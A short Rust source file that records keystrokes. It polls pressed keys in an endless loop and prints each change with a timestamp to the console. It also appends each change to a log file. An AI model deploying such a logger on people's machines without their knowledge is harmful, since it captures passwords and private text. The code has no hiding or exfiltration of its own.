use chrono::prelude::*;
use device_query::{DeviceQuery, DeviceState};
use std::fs::OpenOptions;
use std::io::Write;

pub fn run(path: String) {
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .expect("Failed to open file");

    loop {
        let local: DateTime<Local> = Local::now();

        let keys = device_state.get_keys();
        if keys != prev_keys && !keys.is_empty() {
            println!("[{:?}] [Keyboard] {:?}", local, keys);

            writeln!(file, "[{:?}] [Keyboard] {:?}", local, keys).expect("Failed to write to file");
        }
        prev_keys = keys;
    }
}
